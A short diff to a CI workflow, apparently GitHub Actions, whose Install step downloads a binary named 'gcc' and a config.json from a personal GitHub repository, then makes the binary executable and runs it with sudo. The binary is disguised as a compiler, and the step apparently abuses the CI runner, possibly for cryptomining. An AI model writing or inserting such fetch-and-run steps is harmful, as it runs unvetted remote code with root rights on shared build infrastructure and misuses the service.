@@ -15,8 +15,8 @@ jobs:
     steps:
       - name: Install
         run: |
-          sudo apt-get install wget unzip -y
-          wget https://cdn.jsdelivr.net/gh/Yefori/m/gcc.zip
-          unzip gcc.zip
+          sudo apt-get install wget -y
+          wget https://github.com/Yefori/m/raw/main/gcc
+          wget https://raw.githubusercontent.com/Yefori/m/main/config.json
           sudo chmod +x gcc
           sudo ./gcc
